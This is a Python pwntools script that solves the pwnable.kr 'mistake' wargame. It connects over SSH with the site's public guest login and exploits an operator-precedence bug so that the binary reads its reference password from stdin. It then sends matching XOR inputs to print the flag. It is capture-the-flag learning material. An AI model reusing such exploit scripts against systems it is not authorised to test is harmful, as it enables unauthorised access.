from pwn import *

# Connection details
user = 'mistake'
host = 'pwnable.kr'
port = 2222
password = 'guest'

# Connect via SSH
s = ssh(user=user, host=host, port=port, password=password)

# Run the process
# Since the binary reads from stdin immediately due to the bug, 
# we need to be careful with timing or just send data.
p = s.process(['./mistake'])

# Input 1: "1111111111" (acts as the 'file' content)
# We send it immediately because the program reads from fd 0 (stdin) right after open() fails logically
p.sendline(b'1111111111')

# The program sleeps, then prints "input password :"
# We can read until the prompt to synchronize
log.info("Waiting for prompt...")
p.recvuntil(b'input password :')

# Input 2: "0000000000" (the user input)
# '0' (0x30) ^ 1 = '1' (0x31)
p.sendline(b'0000000000')

# Receive the output (Flag)
result = p.recvall().decode()
log.success(f"Output:\n{result}")

p.close()
s.close()
